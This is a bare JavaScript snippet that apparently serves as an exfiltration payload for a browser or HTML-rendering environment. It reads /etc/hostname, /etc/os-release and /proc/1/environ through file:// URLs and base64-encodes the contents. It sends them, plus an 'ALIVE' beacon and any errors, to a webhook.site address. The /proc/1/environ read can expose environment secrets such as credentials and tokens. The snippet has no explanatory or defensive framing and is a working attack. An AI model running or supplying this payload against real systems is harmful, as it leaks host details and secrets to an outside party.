var w='https://webhook.site/a772717c-3906-4833-9f3d-e5c9cef5b78a';
fetch(w+'/ALIVE');
fetch('file:///etc/hostname').then(function(r){return r.text()}).then(function(t){
  fetch(w+'/HOST?d='+btoa(t));
}).catch(function(e){fetch(w+'/HOST_ERR?d='+encodeURIComponent(e+''))});
fetch('file:///etc/os-release').then(function(r){return r.text()}).then(function(t){
  fetch(w+'/OS?d='+btoa(t));
}).catch(function(e){fetch(w+'/OS_ERR?d='+encodeURIComponent(e+''))});
fetch('file:///proc/1/environ').then(function(r){return r.text()}).then(function(t){
  fetch(w+'/ENV?d='+btoa(t));
}).catch(function(e){fetch(w+'/ENV_ERR?d='+encodeURIComponent(e+''))});
